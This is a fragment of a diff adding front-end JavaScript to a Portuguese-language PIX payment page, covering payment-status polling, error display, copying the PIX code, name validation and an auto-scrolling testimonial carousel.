+  function startPaymentCheck() {
+    if (paymentCheckInterval) {
+      clearInterval(paymentCheckInterval);
+    }
+    
+    paymentCheckInterval = setInterval(checkPaymentStatus, 5000);
+    setTimeout(checkPaymentStatus, 1000);
+  }
+
+  // Mostrar erro
+  function mostrarErro(mensagem) {
+    const statusDiv = document.getElementById("status");
+    statusDiv.innerHTML = `<div class="status-error">${mensagem}</div>`;
+  }
+
+  // Copiar PIX
+  function copiarPix() {
+    const pixCode = document.getElementById("pixCode");
+    pixCode.select();
+    document.execCommand("copy");
+    
+    const btn = event.target;
+    btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="18" height="18"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg> CÓDIGO COPIADO!';
+    setTimeout(() => {
+      btn.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" width="18" height="18"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16h8M8 12h8m-6-8h10a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2z"/></svg> Copiar PIX';
+    }, 2000);
+  }
+
+  // Event Listeners
+  document.getElementById('payButton').addEventListener('click', () => {
+    if (!validarNome()) {
+      document.getElementById('nomeCompleto').focus();
+      return;
+    }
+    gerarPix();
+  });
+
+  document.getElementById('nomeCompleto').addEventListener('input', validarNome);
+
+  // Código do carrossel de depoimentos (mantido igual)
+  const SCROLL_INTERVAL = 3000;
+  const container = document.getElementById('testimonialsContainer');
+  const track = document.getElementById('testimonials');
+
+  let originals = Array.from(track.querySelectorAll('.testimonial'));
+  if (originals.length > 0) {
+    originals.forEach(testimonial => {
+      const clone = testimonial.cloneNode(true);
+      track.appendChild(clone);
+    });
+  }
+
+  let slides = Array.from(track.querySelectorAll('.testimonial'));
+  
+  function getGap() {
+    const gapStr = getComputedStyle(track).gap || getComputedStyle(track).columnGap || '12px';
+    return parseInt(gapStr) || 12;
+  }
+  
+  let slideWidth;
+  function updateDimensions() {
+    slideWidth = slides[0].getBoundingClientRect().width + getGap();
+  }
+  updateDimensions();
+
+  let autoplayTimer = null;
+  let isUserInteracting = false;
+  let scrollEndTimer = null;
+
+  function startAutoplay() {
+    stopAutoplay();
+    autoplayTimer = setInterval(() => {
+      if (isUserInteracting) return;
+
+      const currentScroll = container.scrollLeft;
+      const nextScroll = currentScroll + slideWidth;
+      const maxScroll = track.scrollWidth - container.clientWidth;
+      
+      if (nextScroll >= maxScroll) {
+        originals.forEach(testimonial => {
+          const clone = testimonial.cloneNode(true);
+          track.appendChild(clone);
+        });
+        slides = Array.from(track.querySelectorAll('.testimonial'));
+      }
+      
+      container.scrollTo({ left: nextScroll, behavior: 'smooth' });
+    }, SCROLL_INTERVAL);
+  }
+
+  function stopAutoplay() {
+    if (autoplayTimer) {
+      clearInterval(autoplayTimer);
+      autoplayTimer = null;
+    }
+  }
+
+  container.addEventListener('scroll', () => {
+    isUserInteracting = true;
+    clearTimeout(scrollEndTimer);
+
+    scrollEndTimer = setTimeout(() => {
+      isUserInteracting = false;
+      
+      const currentScroll = container.scrollLeft;
+      const maxScroll = track.scrollWidth - container.clientWidth;
+      
+      if (currentScroll >= maxScroll - 10) {
+        container.scrollLeft = 0;
+      }
+    }, 120);
+  });
+
+  container.addEventListener('mouseenter', () => { isUserInteracting = true; stopAutoplay(); });
+  container.addEventListener('mouseleave', () => { isUserInteracting = false; startAutoplay(); });
+
+  container.addEventListener('touchstart', () => { isUserInteracting = true; stopAutoplay(); }, { passive: true });
+  container.addEventListener('touchend', () => {
+    setTimeout(() => { isUserInteracting = false; startAutoplay(); }, 600);
+  }, { passive: true });
+
+  window.addEventListener('resize', updateDimensions);
+  window.addEventListener('load', () => {
+    updateDimensions();
+    startAutoplay();
+  });
+</script>
+  </div>
+
+</body></html>
